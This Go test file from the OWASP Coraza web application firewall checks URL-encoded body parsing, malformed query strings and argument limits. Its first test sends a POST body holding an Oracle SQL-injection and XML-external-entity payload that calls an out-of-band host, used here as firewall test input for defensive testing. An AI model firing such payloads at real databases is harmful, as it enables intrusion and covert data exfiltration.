// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

package engine

import (
	"github.com/corazawaf/coraza/v3/testing/profile"
)

var _ = profile.RegisterProfile(profile.Profile{
	Meta: profile.Meta{
		Author:      "jptosso",
		Description: "Test if the body processors work",
		Enabled:     true,
		Name:        "special_urlencoded.yaml",
	},
	Tests: []profile.Test{
		{
			Title: "posturlencoded",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI:    "/",
							Method: "POST",
							Data:   `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`,
						},
						Output: profile.ExpectedOutput{
							TriggeredRules: []int{100},
						},
					},
				},
			},
		},
		{
			Title: "malformed urlencoded body keeps its arguments",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI:    "/",
							Method: "POST",
							Data:   "a=%ZZ",
						},
						Output: profile.ExpectedOutput{
							TriggeredRules: []int{100, 101},
						},
					},
				},
			},
		},
		{
			Title: "malformed query string keeps its arguments",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI: "/?a=%ZZ",
						},
						Output: profile.ExpectedOutput{
							TriggeredRules: []int{100, 101},
						},
					},
				},
			},
		},
		{
			Title: "malformed query string on the URI parse fallback",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI: "/\x7f?a=%ZZ",
						},
						Output: profile.ExpectedOutput{
							TriggeredRules: []int{100, 101},
						},
					},
				},
			},
		},
		{
			Title: "well-formed query string",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI: "/?a=%41",
						},
						Output: profile.ExpectedOutput{
							NonTriggeredRules: []int{100, 101},
						},
					},
				},
			},
		},
	},
	Rules: `
SecRequestBodyAccess On
SecAction "id:1, phase:1, ctl:forceRequestBodyVariable=on"
SecRule URLENCODED_ERROR "@eq 1" "id:100, phase:2, log"
SecRule ARGS:a "@streq %ZZ" "id:101, phase:2, log"
`,
})

var _ = profile.RegisterProfile(profile.Profile{
	Meta: profile.Meta{
		Author:      "justadityaraj",
		Description: "URLENCODED_ERROR is set for malformed pairs past SecArgumentsLimit",
		Enabled:     true,
		Name:        "special_urlencoded_arguments_limit.yaml",
	},
	Tests: []profile.Test{
		{
			Title: "malformed pair past the limit",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI: "/?a=1&b=2&c=%ZZ",
						},
						Output: profile.ExpectedOutput{
							TriggeredRules: []int{100, 102},
						},
					},
				},
			},
		},
		{
			Title: "well-formed pairs past the limit",
			Stages: []profile.Stage{
				{
					Stage: profile.SubStage{
						Input: profile.StageInput{
							URI: "/?a=1&b=2&c=3",
						},
						Output: profile.ExpectedOutput{
							TriggeredRules:    []int{102},
							NonTriggeredRules: []int{100},
						},
					},
				},
			},
		},
	},
	Rules: `
SecArgumentsLimit 2
SecRule URLENCODED_ERROR "@eq 1" "id:100, phase:2, log"
SecRule ARGUMENTS_LIMIT_REACHED "@eq 1" "id:102, phase:2, log"
`,
})
